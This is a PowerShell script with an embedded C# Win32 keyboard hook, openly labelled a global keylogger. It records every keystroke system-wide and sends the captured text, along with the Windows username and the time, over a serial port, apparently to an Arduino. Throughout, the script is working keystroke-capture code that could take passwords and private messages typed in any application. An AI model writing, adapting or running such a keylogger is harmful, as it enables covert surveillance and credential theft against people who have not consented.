param(
    [string]$Port = "COM14",
    [int]$BaudRate = 9600
)

# ===== API Win32 para capturar teclas globales =====
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyboardHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc;
    private static IntPtr _hookID = IntPtr.Zero;
    
    public static event Action<int> KeyPressed;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("user32.dll")]
    private static extern int GetKeyboardState(byte[] lpKeyState);
    
    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
    
    public static void Start() {
        _proc = HookCallback;
        _hookID = SetHook(_proc);
    }
    
    public static void Stop() {
        UnhookWindowsHookEx(_hookID);
    }
    
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            KeyPressed?.Invoke(vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

# ===== Funciones Serial =====
function ListaPuertos { 
    try { [System.IO.Ports.SerialPort]::GetPortNames() | Sort-Object } 
    catch { @() } 
}

function AbrirPuerto {
    param($p, $b)
    try {
        $sp = New-Object System.IO.Ports.SerialPort $p, $b, "None", 8, "One"
        $sp.ReadTimeout = 500
        $sp.WriteTimeout = 500
        $sp.Open()
        return $sp
    } catch {
        Write-Host "ERROR abrir puerto $p : $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Enviar {
    param($sp, [string]$txt)
    if (-not $sp -or -not ($sp -is [System.IO.Ports.SerialPort])) { return $false }
    try {
        $sp.WriteLine($txt)
        return $true
    } catch {
        Write-Host "ERROR escribir serial: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# ===== Mapeo de teclas virtuales a texto =====
function ConvertirTecla {
    param([int]$vkCode)
    
    $teclasMapeadas = @{
        8 = "<BACK>"
        9 = "<TAB>"
        13 = "`n"
        27 = "<ESC>"
        32 = " "
        46 = "<DEL>"
        112 = "<F1>"; 113 = "<F2>"; 114 = "<F3>"; 115 = "<F4>"
        116 = "<F5>"; 117 = "<F6>"; 118 = "<F7>"; 119 = "<F8>"
        120 = "<F9>"; 121 = "<F10>"; 122 = "<F11>"; 123 = "<F12>"
        37 = "<LEFT>"; 38 = "<UP>"; 39 = "<RIGHT>"; 40 = "<DOWN>"
        160 = ""; 161 = ""  # Shift (ignorar)
        162 = ""; 163 = ""  # Ctrl (ignorar)
        164 = ""; 165 = ""  # Alt (ignorar)
    }
    
    if ($teclasMapeadas.ContainsKey($vkCode)) {
        return $teclasMapeadas[$vkCode]
    }
    
    # Obtener carácter desde VK code usando Win32
    try {
        $keyState = New-Object byte[] 256
        [void][KeyboardHook]::GetType().GetMethod('GetKeyboardState', 
            [System.Reflection.BindingFlags]'NonPublic,Static').Invoke($null, @(,$keyState))
        
        $sb = New-Object System.Text.StringBuilder 5
        $result = [KeyboardHook]::GetType().GetMethod('ToUnicode',
            [System.Reflection.BindingFlags]'NonPublic,Static').Invoke($null, 
            @([uint]$vkCode, [uint]0, $keyState, $sb, $sb.Capacity, [uint]0))
        
        if ($result -gt 0) {
            return $sb.ToString()
        }
    } catch {}
    
    # Fallback: letras A-Z
    if ($vkCode -ge 65 -and $vkCode -le 90) {
        return [char]$vkCode
    }
    
    return ""
}

# ===== Inicio =====
Write-Host "=== KEYLOGGER SERIAL GLOBAL ===" -ForegroundColor Cyan
$puertos = ListaPuertos
Write-Host "Puertos detectados:" ($puertos -join ", ")

if ($puertos.Count -eq 0) { 
    Write-Host "No hay puertos serie. Conecta Arduino." -ForegroundColor Yellow
    exit 1 
}

if (-not ($puertos -contains $Port)) {
    Write-Host "Puerto $Port no detectado. Usando: $($puertos[0])" -ForegroundColor Yellow
    $Port = $puertos[0]
}

$sp = AbrirPuerto -p $Port -b $BaudRate
if (-not $sp) { 
    Write-Host "No se pudo abrir puerto. Cierra otras apps." -ForegroundColor Red
    exit 1 
}

# Enviar info del sistema
$usuario = $env:USERNAME
$sistema = [System.Environment]::OSVersion.Platform
$hora = Get-Date -Format "HH:mm"
$info = "$hora $usuario $sistema"
Enviar $sp $info
Write-Host "Puerto abierto: $Port @ $BaudRate baud" -ForegroundColor Green
Write-Host "Info enviada: $info" -ForegroundColor Gray
Write-Host "`nCapturando teclas GLOBALMENTE. Presiona ESC para salir.`n" -ForegroundColor Cyan

# Variables globales
$script:buffer = ""
$script:running = $true
$script:sp = $sp

# Handler de eventos de teclado
$keyHandler = {
    param([int]$vkCode)
    
    # ESC para salir (vkCode 27)
    if ($vkCode -eq 27) {
        $script:running = $false
        Write-Host "`n[ESC] Deteniendo..." -ForegroundColor Yellow
        return
    }
    
    $tecla = ConvertirTecla -vkCode $vkCode
    
    if ($tecla -eq "") { return }
    
    # Backspace: borrar último caracter
    if ($vkCode -eq 8 -and $script:buffer.Length -gt 0) {
        $script:buffer = $script:buffer.Substring(0, $script:buffer.Length - 1)
        Write-Host -NoNewline "`b `b"
    } else {
        $script:buffer += $tecla
        if ($tecla -eq "`n") {
            Write-Host ""
        } else {
            Write-Host -NoNewline $tecla
        }
    }
    
    # Enviar últimos 32 caracteres
    $toSend = if ($script:buffer.Length -gt 32) { 
        $script:buffer.Substring($script:buffer.Length - 32) 
    } else { 
        $script:buffer 
    }
    
    Enviar $script:sp $toSend | Out-Null
    
    # Limpiar buffer si es muy largo
    if ($script:buffer.Length -ge 100) {
        Write-Host "`n[Buffer lleno - limpiando]" -ForegroundColor Yellow
        Enviar $script:sp "LIMPIANDO..." | Out-Null
        Start-Sleep -Milliseconds 500
        $script:buffer = ""
    }
}

# Registrar evento y iniciar hook
Register-EngineEvent -SourceIdentifier KeyPressed -Action $keyHandler | Out-Null
[KeyboardHook]::KeyPressed = [Action[int]] {
    param($vk)
    New-Event -SourceIdentifier KeyPressed -MessageData $vk | Out-Null
}

[KeyboardHook]::Start()

# Loop principal (no bloqueante)
try {
    while ($script:running) {
        Start-Sleep -Milliseconds 100
    }
} finally {
    [KeyboardHook]::Stop()
    Unregister-Event -SourceIdentifier KeyPressed -ErrorAction SilentlyContinue
    Remove-Job -Name KeyPressed -ErrorAction SilentlyContinue
    
    try { $sp.Close(); $sp.Dispose() } catch {}
    Write-Host "`nPuerto cerrado. Finalizado." -ForegroundColor Green
}